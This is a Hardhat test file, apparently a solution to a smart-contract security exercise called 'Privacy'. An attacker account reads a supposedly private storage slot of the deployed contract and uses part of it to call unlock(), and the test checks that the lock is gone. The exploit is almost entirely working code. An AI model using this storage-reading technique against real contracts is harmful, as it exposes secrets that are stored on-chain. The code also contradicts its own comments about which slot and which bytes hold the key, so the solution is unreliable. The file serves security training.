const { expect } = require("chai");
const { ethers } = require("hardhat");
const { v4: uuidv4 } = require('uuid');
const Web3Utils = require('web3-utils');

describe("Exercise 12 - Privacy", function () {

    let deployer, attacker;
    // Generate some 'random' data to send to the contract
    const UUID_ELEM = uuidv4().split("-");
    const data = [
        ethers.utils.hexZeroPad(Web3Utils.asciiToHex(UUID_ELEM[0]), 32),
        ethers.utils.hexZeroPad(Web3Utils.asciiToHex(UUID_ELEM[1]), 32),
        ethers.utils.hexZeroPad(Web3Utils.asciiToHex(UUID_ELEM[2]), 32),
    ];

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Privacy = await ethers.getContractFactory("Privacy");
        this.contract = await Privacy.deploy(data);

        await this.contract.deployed();

        const locked = await this.contract.locked();
        expect(locked).to.be.true;
        console.log(`Privacy is locked? ${locked}`);
    });


    it("Unlock Privacy contract", async function () {
        // Read contracts storage values, 
        // 1st storage value the boolean that belongs to the locked parameter
        // 2nd storage value is the block timestamp (uint256)
        // 3rd storage value contains flattening (10 uint8 = 0x0a), denomination (255 uint8 = 0xff) and awkwardness (uint16)
        // 4-6th storage values belongs to the data array bytes32[3]
        // the key that we need to unlock, is data[2], so is the 6th stored value (but first 16 bytes)
        // for (let i = 0; i < 10; i++) {
        //     const storageVal = await ethers.provider.getStorageAt(this.contract.address, i);
        //     console.log(storageVal)
        // }
        const storedKey = await ethers.provider.getStorageAt(this.contract.address, 6);
        await this.contract.connect(attacker).unlock(ethers.utils.hexDataSlice(storedKey, 16));

        const locked = await this.contract.connect(attacker).locked();
        expect(locked).to.be.false;
        console.log(`Privacy is locked? ${locked}`);
    });

});
